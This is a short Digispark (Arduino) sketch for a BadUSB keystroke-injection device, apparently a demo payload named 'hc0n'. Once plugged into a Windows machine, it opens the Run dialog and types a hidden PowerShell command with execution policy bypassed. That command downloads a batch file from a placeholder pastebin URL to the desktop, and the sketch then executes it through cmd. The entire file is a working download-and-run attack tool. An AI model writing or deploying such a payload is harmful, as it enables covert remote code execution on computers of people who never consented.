#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  delay(4000);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  delay(5000);
  DigiKeyboard.println("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('[url_pastebin]',\\\"$env:userprofile\\Desktop\\hc0n.bat\\\")");
  delay(12000);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  delay(3000);
  DigiKeyboard.println("cmd");
  delay(5000);
  DigiKeyboard.println("cd %USERPROFILE%\\Desktop");
  delay(4000);
  DigiKeyboard.println("hc0n.bat");
  while(1);
}
